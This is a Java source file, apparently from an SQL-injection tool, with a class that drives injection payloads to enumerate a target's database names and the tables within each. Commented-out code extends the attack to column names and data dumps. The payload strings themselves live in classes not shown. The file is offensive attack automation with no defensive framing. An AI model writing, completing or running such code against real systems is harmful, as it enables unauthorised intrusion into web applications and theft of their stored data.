package com.dhee.mine.Utils.injection;


import com.dhee.mine.Utils.payload.PayloadSchema;
import com.dhee.mine.Utils.payload.PayloadTable;
import com.dhee.mine.Utils.enty.Database;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;


public class SQLInjectionResult {
    List<Database> databases = new ArrayList<>();

    public List<Database> databaseBlasting(Map<String, String> paramMap, String sign) {

        SQLInjectionHandler sqlInjectionHandler = new SQLInjectionHandler(paramMap, sign);
        int possibleColumns = sqlInjectionHandler.injectionColumnCount;
        String schemaNamePayload = new PayloadSchema().getPayload(sign, possibleColumns);
        List<String> databaseNameSet = sqlInjectionHandler.processResult(schemaNamePayload);
        System.out.println(databaseNameSet);
        for (String databaseName : databaseNameSet) {
            Database database = new Database(databaseName);
            databases.add(database);
        }
        for (Database database : databases) {
            String tableNamePayload = new PayloadTable().getPayload(sign, possibleColumns, database.getDatabase_name());
            List<String> tableNameSet = sqlInjectionHandler.processResult(tableNamePayload);
            database.setTables(tableNameSet);
//            for (Table table : database.getTables()) {
//                String columnNamePayload = new PayloadColumn().getPayload(sign, possibleColumns, database.getDatabase_name(), table.getTable_name());
//                List<String> columnNameSet = sqlInjectionHandle.ResultHandle(columnNamePayload);
//                table.setColumns(columnNameSet);
//                for (String columnName : columnNameSet){
//                    String dataSourcePayload = new DataSourceBlasting().DataSourcePayload(sign, possibleColumns, databaseName, tableName, columnName);
//                    List<String> dataSourceSet = sqlInjectionHandle.PageInjection(dataSourcePayload);
//                    System.out.println(columnName+":"+dataSourceSet);
//                }
//            }
        }
        return databases;
    }
}